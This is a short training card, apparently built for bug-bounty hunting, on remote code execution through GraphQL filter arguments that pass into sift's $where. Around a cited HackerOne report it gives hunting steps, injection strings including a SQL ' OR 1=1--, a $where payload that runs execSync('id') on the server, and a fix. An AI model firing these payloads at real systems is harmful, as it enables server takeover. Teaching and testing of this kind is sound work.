---
name: graphql-rce-filter
description: Unauthenticated RCE via a GraphQL filter argument that flows into a MongoDB-style query (sift $where) enabling JS execution. Teaches GraphQL-argument-to-query-injection.
sources: hackerone_public
report_count: 1
---

# GraphQL → RCE via filter argument (sift `$where`)

**Report**: Mozilla — "Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)" (hackerone.com/reports/3782701). Also SQLi in GraphQL (HackerOne #435066), NoSQLi via `$where`.

## Why it matters (the new lesson)
GraphQL "filter"/"where" arguments are often passed straight into a query builder (SQL, MongoDB, sift, Elasticsearch). If the filter is passed opaquely to a lib that evaluates JS (like sift's `$where`), you get server-side code execution — not just data read.

## How it works
```graphql
{ tasks(filter: { $where: "return (function(){ ... })()" }) { ... } }
```
The filter object reaches `sift`, whose `$where` evaluates the string as JavaScript on the server.

## How to hunt for it
1. Find GraphQL `filter`/`where`/`query` arguments.
2. Inject query-operator objects: `$where`, `$regex`, `$gt`, `$ne`, `__proto__`, `constructor`.
3. For MongoDB/sift, try `$where` with JS; for SQL, try `' OR 1=1--`; for Elasticsearch, try script injection.

## Payloads
```
{ $where: "sleep(5000)" }                       # NoSQLi timing / sift RCE
filter: { $where: "return process.mainModule.require('child_process').execSync('id').toString()" }
```

## Fix
Whitelist filter fields/operators; never pass raw filter objects to JS-evaluating libs; use parameterized queries.
